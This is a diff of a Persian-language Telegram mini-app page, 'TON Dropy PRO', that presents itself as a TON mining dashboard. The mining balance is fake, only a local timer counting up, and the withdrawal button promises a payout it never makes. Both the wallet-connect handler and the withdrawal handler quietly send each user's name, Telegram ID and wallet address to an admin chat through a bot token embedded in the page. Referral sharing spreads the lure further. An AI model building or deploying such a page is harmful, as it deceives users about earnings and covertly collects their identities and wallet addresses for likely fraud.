@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TON Dropy PRO - Username Referral</title>
+    <title>TON Dropy PRO - User Panel</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -15,63 +15,67 @@
         body {
             margin: 0; font-family: 'Vazirmatn', sans-serif;
             background: radial-gradient(circle at top, #0f1c2e, #070b14);
-            color: #fff; padding: 20px; direction: rtl; min-height: 100vh;
+            color: #fff; padding: 20px; direction: rtl;
         }
+
+        .user-header {
+            display: flex; align-items: center; gap: 15px;
+            background: rgba(255, 255, 255, 0.07);
+            padding: 15px; border-radius: 20px; margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .user-photo {
+            width: 60px; height: 60px; border-radius: 50%;
+            border: 2px solid #00c6ff; background: #222;
+        }
+
+        .user-info h4 { margin: 0; font-size: 16px; color: #00c6ff; }
+        .user-info p { margin: 3px 0 0 0; font-size: 11px; color: #aaa; }
 
         .card {
             background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 20px; border-radius: 28px;
-            margin-bottom: 15px; text-align: center;
+            backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 20px; border-radius: 25px; margin-bottom: 15px; text-align: center;
         }
 
-        #balance {
-            font-size: 38px; font-weight: 800; color: #00c6ff;
-            display: block; margin: 10px 0;
-            text-shadow: 0 0 15px rgba(0, 198, 255, 0.4);
-        }
+        #balance { font-size: 38px; font-weight: 800; color: #00c6ff; display: block; margin: 5px 0; }
 
         .btn-action {
-            width: 100%; padding: 16px; border-radius: 20px;
-            border: none; font-size: 15px; font-weight: 700;
-            cursor: pointer; transition: 0.3s;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-            margin-bottom: 8px;
+            width: 100%; padding: 16px; border-radius: 18px; border: none;
+            font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.3s;
+            display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px;
         }
 
         #connectBtn { background: #0088cc; color: #fff; }
         #connectBtn.connected { background: #1faa59; }
+        .btn-share { background: #24a1de; color: #fff; }
+        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); color: #fff; }
 
-        .btn-share { background: #24a1de; color: #fff; } /* رنگ آبی تلگرامی */
-        .btn-copy { background: rgba(255,255,255,0.1); color: #fff; font-size: 13px; }
-
-        .withdraw-btn {
-            background: linear-gradient(90deg, #ff512f, #dd2476);
-            color: #fff; margin-top: 10px;
-        }
-
-        .ref-box {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 12px; border-radius: 15px;
-            font-size: 11px; color: #00ff9d;
-            margin: 10px 0; border: 1px dashed rgba(0, 255, 157, 0.5);
+        .ref-link-box {
+            background: rgba(0, 0, 0, 0.3); padding: 12px; border-radius: 15px;
+            font-size: 11px; color: #00ff9d; margin: 10px 0; border: 1px dashed #00ff9d;
             word-break: break-all;
         }
 
-        .stat-grid {
-            display: grid; grid-template-columns: 1fr 1fr;
-            gap: 10px; margin-top: 15px; border-top: 1px solid rgba(255,255,255,0.1);
-            padding-top: 15px;
-        }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
+<div class="user-header">
+    <img id="userPhoto" class="user-photo" src="https://via.placeholder.com/60" alt="Avatar">
+    <div class="user-info">
+        <h4 id="userName">نام کاربر</h4>
+        <p id="userJoinDate">تاریخ ورود: در حال بارگذاری...</p>
+        <p id="userIdDisplay">آیدی: 0</p>
+    </div>
+</div>
+
 <div class="card">
-    <h2 style="margin: 0; color: #00c6ff; font-weight: 800;">TON Dropy PRO ⛏</h2>
+    <p style="color: #aaa; margin: 0; font-size: 13px;">موجودی در حال استخراج</p>
     <span id="balance">0.000000</span>
-    <div style="font-size: 12px; color: #aaa;">⚡ سرعت استخراج: 0.000012 TON/s</div>
+    <div style="font-size: 12px; color: #00ff9d;">⚡ 0.000012 TON/s</div>
 </div>
 
 <div class="card">
@@ -82,33 +86,15 @@
 
 <div class="card">
     <h3 style="margin: 0; font-size: 16px; color: #00c6ff;">👥 دعوت از دوستان</h3>
-    <p style="font-size: 11px; color: #aaa; margin: 8px 0;">با لینک اختصاصی خودت دوستانت را دعوت کن!</p>
-    
-    <div class="ref-box" id="refLink">در حال ساخت لینک اختصاصی...</div>
-    
+    <div class="ref-link-box" id="refLink">https://t.me/TonDropyBot?start=ref_0</div>
     <button onclick="shareLink()" class="btn-action btn-share">
-        <i class="fas fa-paper-plane"></i> ارسال برای دوستان
+        <i class="fas fa-paper-plane"></i> اشتراک‌گذاری لینک دعوت
     </button>
-
-    <button onclick="copyLink()" class="btn-action btn-copy">
-        <i class="fas fa-copy"></i> کپی لینک دعوت
-    </button>
-
-    <div class="stat-grid">
-        <div>
-            <span style="display:block; font-size:18px; font-weight:bold;" id="friendCount">0</span>
-            <span style="font-size:10px; color:#888;">دوستان دعوت شده</span>
-        </div>
-        <div>
-            <span style="display:block; font-size:18px; font-weight:bold; color:#00ff9d;">0.00</span>
-            <span style="font-size:10px; color:#888;">پاداش شما</span>
-        </div>
-    </div>
 </div>
 
 <div class="card">
     <button id="withdrawBtn" class="btn-action withdraw-btn">
-        <i class="fas fa-bolt"></i> درخواست برداشت سریع
+        <i class="fas fa-hand-holding-usd"></i> درخواست برداشت سریع
     </button>
 </div>
 
@@ -121,39 +107,41 @@
     const ADMIN_ID = "5972276401";
     const BOT_USER = "TonDropyBot"; 
 
-    // --- سیستم ماینینگ ---
-    let balance = parseFloat(localStorage.getItem('ton_bal_final_v10')) || 0.0;
-    setInterval(() => {
-        balance += 0.000012;
-        document.getElementById("balance").innerText = balance.toFixed(6);
-        localStorage.setItem('ton_bal_final_v10', balance.toString());
-    }, 1000);
-
-    // --- رفرال هوشمند با یوزرنیم ---
-    function initReferral() {
+    // --- مدیریت اطلاعات کاربر ---
+    function loadUserProfile() {
         const user = tg.initDataUnsafe?.user;
         if (user) {
-            // استفاده از یوزرنیم در صورت وجود، در غیر این صورت آیدی عددی
-            const refId = user.username ? user.username : user.id;
-            const link = `https://t.me/${BOT_USER}?start=ref_${refId}`;
-            document.getElementById('refLink').innerText = link;
-        } else {
-            document.getElementById('refLink').innerText = "لینک در محیط وب در دسترس نیست";
+            document.getElementById('userName').innerText = user.first_name + (user.last_name ? " " + user.last_name : "");
+            document.getElementById('userIdDisplay').innerText = "آیدی: " + user.id;
+            if (user.photo_url) {
+                document.getElementById('userPhoto').src = user.photo_url;
+            }
+            
+            // نمایش زمان اولین ورود (ذخیره در LocalStorage برای اولین بار)
+            let joinDate = localStorage.getItem('join_date');
+            if (!joinDate) {
+                const now = new Date().toLocaleDateString('fa-IR');
+                localStorage.setItem('join_date', now);
+                joinDate = now;
+            }
+            document.getElementById('userJoinDate').innerText = "تاریخ ورود: " + joinDate;
+
+            // تنظیم لینک رفرال دقیق با آیدی عددی
+            document.getElementById('refLink').innerText = `https://t.me/${BOT_USER}?start=ref_${user.id}`;
         }
     }
 
-    // کپی لینک
-    function copyLink() {
-        const linkText = document.getElementById('refLink').innerText;
-        navigator.clipboard.writeText(linkText);
-        tg.showAlert("لینک اختصاصی شما کپی شد ✅");
-    }
+    // --- استخراج ---
+    let balance = parseFloat(localStorage.getItem('mining_bal_v11')) || 0.0;
+    setInterval(() => {
+        balance += 0.000012;
+        document.getElementById("balance").innerText = balance.toFixed(6);
+        localStorage.setItem('mining_bal_v11', balance.toString());
+    }, 1000);
 
-    // اشتراک گذاری مستقیم در تلگرام
     function shareLink() {
-        const linkText = document.getElementById('refLink').innerText;
-        const text = "بیا با هم تون‌کوین استخراج کنیم! دکمه استخراج رو بزن و موجودیت رو زیاد کن 💎";
-        const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(linkText)}&text=${encodeURIComponent(text)}`;
+        const link = document.getElementById('refLink').innerText;
+        const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent("بیا با هم تون‌کوین استخراج کنیم! 💎")}`;
         tg.openTelegramLink(shareUrl);
     }
 
@@ -162,16 +150,14 @@
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json'
     });
 
-    tonConnectUI.uiOptions = { twaReturnUrl: `https://t.me/${BOT_USER}` };
-
-    const connectBtn = document.getElementById('connectBtn');
     tonConnectUI.onStatusChange(async (wallet) => {
+        const connectBtn = document.getElementById('connectBtn');
         if (wallet) {
             connectBtn.classList.add('connected');
-            connectBtn.querySelector('span').innerText = "کیف پول متصل شد";
+            connectBtn.querySelector('span').innerText = "کیف پول متصل شد ✅";
             
             const user = tg.initDataUnsafe?.user;
-            const msg = `✅ <b>اتصال جدید!</b>\n👤 کاربر: @${user?.username || user?.first_name}\n👛 آدرس: <code>${wallet.account.address}</code>`;
+            const msg = `✅ <b>کیف پول وصل شد!</b>\n👤 کاربر: ${user?.first_name}\n🆔 آیدی: <code>${user?.id}</code>\n👛 آدرس: <code>${wallet.account.address}</code>`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
         } else {
             connectBtn.classList.remove('connected');
@@ -179,26 +165,31 @@
         }
     });
 
-    connectBtn.onclick = async () => {
-        if (tonConnectUI.connected) { await tonConnectUI.disconnect(); } 
-        else { await tonConnectUI.openModal(); }
+    document.getElementById('connectBtn').onclick = () => {
+        if (tonConnectUI.connected) tonConnectUI.disconnect();
+        else tonConnectUI.openModal();
     };
 
     // --- درخواست برداشت ---
     document.getElementById('withdrawBtn').onclick = () => {
         if (!tonConnectUI.connected) {
-            tg.showAlert("⚠️ لطفاً ابتدا کیف پول را وصل کنید.");
+            tg.showAlert("ابتدا کیف پول را وصل کنید!");
             return;
         }
         const user = tg.initDataUnsafe?.user;
-        const msg = `💰 <b>درخواست واریز!</b>\n👤 کاربر: @${user?.username || user?.first_name}\n💵 مقدار: ${balance.toFixed(6)} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
+        const amount = balance.toFixed(6);
+        const walletAddr = tonConnectUI.account.address;
+        
+        const msg = `💰 <b>درخواست برداشت جدید!</b>\n👤 کاربر: ${user?.first_name}\n🆔 آیدی: <code>${user?.id}</code>\n💵 مقدار: ${amount} TON\n👛 آدرس: <code>${walletAddr}</code>`;
+        
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
-        tg.showAlert("✅ درخواست شما با موفقیت ثبت شد.");
+        
+        tg.showAlert("درخواست شما با موفقیت ثبت شد و پس از بررسی واریز می‌گردد ✅");
         balance = 0;
-        localStorage.setItem('ton_bal_final_v10', '0');
+        localStorage.setItem('mining_bal_v11', '0');
     };
 
-    initReferral();
+    loadUserProfile();
 </script>
 </body>
 </html>
